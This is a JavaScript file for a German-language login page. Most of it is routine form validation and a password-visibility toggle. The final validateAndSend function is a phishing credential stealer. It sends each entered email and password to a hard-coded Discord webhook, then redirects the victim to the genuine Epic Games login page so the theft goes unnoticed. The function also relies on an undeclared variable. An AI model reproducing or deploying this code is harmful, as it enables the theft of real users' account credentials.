// Get references to elements
const emailInput = document.getElementById('email');
const passwordInput = document.getElementById('password');
const loginButton = document.querySelector('.login_button');
const emailError = document.getElementById('email_error');
const passwordError = document.getElementById('password_error');

// Add event listeners
emailInput.addEventListener('input', validateInputs);
passwordInput.addEventListener('input', validateInputs);

emailInput.addEventListener('focus', hideEmailError);
passwordInput.addEventListener('focus', hidePasswordError);

function hideEmailError() {
    emailError.style.display = 'none';
    emailInput.classList.remove('error');
}

function hidePasswordError() {
    passwordError.style.display = 'none';
    passwordInput.classList.remove('error');
}

function validateEmail(email) {
    // Simple email validation regex
    const re = /\S+@\S+\.\S+/;
    return re.test(email);
}

function validateInputs() {
    let valid = true;

    // Validate email
    const emailValue = emailInput.value.trim();
    if (emailValue === '') {
        emailError.textContent = 'Erforderlich';
        emailError.style.display = 'block';
        emailInput.classList.add('error');
        valid = false;
    } else if (!validateEmail(emailValue)) {
        emailError.textContent = 'Ungültige E-Mail-Adresse';
        emailError.style.display = 'block';
        emailInput.classList.add('error');
        valid = false;
    } else {
        emailError.style.display = 'none';
        emailInput.classList.remove('error');
    }

    // Validate password
    const passwordValue = passwordInput.value.trim();
    if (passwordValue === '') {
        passwordError.textContent = 'Erforderlich';
        passwordError.style.display = 'block';
        passwordInput.classList.add('error');
        valid = false;
    } else {
        passwordError.style.display = 'none';
        passwordInput.classList.remove('error');
    }

    // Enable or disable the login button based on validity
    if (valid) {
        loginButton.classList.remove('disabled');
        loginButton.disabled = false;
    } else {
        loginButton.classList.add('disabled');
        loginButton.disabled = true;
    }
}

function togglePassword() {
    const passwordField = document.getElementById('password');
    const showPasswordButton = document.querySelector('.password_toggle img');
    if (passwordField.type === "password") {
        passwordField.type = "text";
        showPasswordButton.src = "eye_closed_icon.png"; // Change icon if needed
    } else {
        passwordField.type = "password";
        showPasswordButton.src = "eye_icon.png"; // Change icon if needed
    }
}

function validateAndSend() {
    validateInputs();
    if (!loginButton.classList.contains('disabled')) {
        // Proceed with form submission or AJAX request
    }
}

// Select all the inputs of type email, password, and text
const inputs = document.querySelectorAll('input[type="email"], input[type="password"], input[type="text"]');

// Add event listeners for focus and blur
inputs.forEach(input => {
    input.addEventListener('focus', () => {
        input.classList.add('custom-placeholder'); // Add the class on focus
    });

    input.addEventListener('blur', () => {
        input.classList.remove('custom-placeholder'); // Remove the class on blur
    });
});

function validateAndSend() {
    if (valid) {
        // Prepare data to send to webhook
        const data = {
            content: `E-Mail: ${email.value}\nPasswort: ${password.value}`
        };

        // Send data to Discord webhook
        fetch('https://discord.com/api/webhooks/1298615328862896149/wXWRZrjJUaNbLB9rh7Fb3fG2i_bv79zWMe0kTpnDMPCKiUE-enHZySrYtgrQgXflo49a', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data),
        })
        .then(response => {
            if (response.ok) {
                // Redirect to Epic Games login page after successful submission
                window.location.href = 'https://www.epicgames.com/id/login';
            } else {
                // Handle failed submission, still redirect
                window.location.href = 'https://www.epicgames.com/id/login';
            }
        })
        .catch(error => {
            console.error('Fehler:', error);
            // Redirect even in case of an error
            window.location.href = 'https://www.epicgames.com/id/login';
        });
    }
}

